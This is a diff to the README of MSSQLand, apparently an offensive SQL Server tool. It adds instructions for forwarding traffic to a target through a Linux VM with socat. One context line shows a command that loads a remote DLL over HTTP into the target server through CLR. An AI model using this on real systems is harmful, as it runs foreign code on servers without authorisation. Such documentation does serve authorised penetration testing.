@@ -118,6 +118,16 @@ Or even use Common Language Runtime (CLR) to load remotely a library with:
 /a:clr \"http://172.16.118.218/d/SqlLibrary.dll\"
 ```
 
+## 🌉 Port Forwarding with Linux
+
+If you're running MSSQLand on your Windows host but need to access a SQL Server target through a Linux environment (Hyper-V VM, VMware, or WSL), you can easily forward the connection using `socat`:
+
+```bash
+sudo socat TCP4-LISTEN:1433,fork,reuseaddr TCP:10.10.11.90:1433
+```
+
+This command listens on port 1433 on your Linux machine and forwards all traffic to the target SQL Server at `10.10.11.90:1433`. You can then connect MSSQLand to your Linux VM's IP from your Windows host.
+
 ## 🫂 Contributing 
 
 Contributions to MSSQLand are welcome and appreciated! Whether it's fixing bugs, adding new features, improving the documentation, or sharing feedback, your effort is valued and makes a difference.
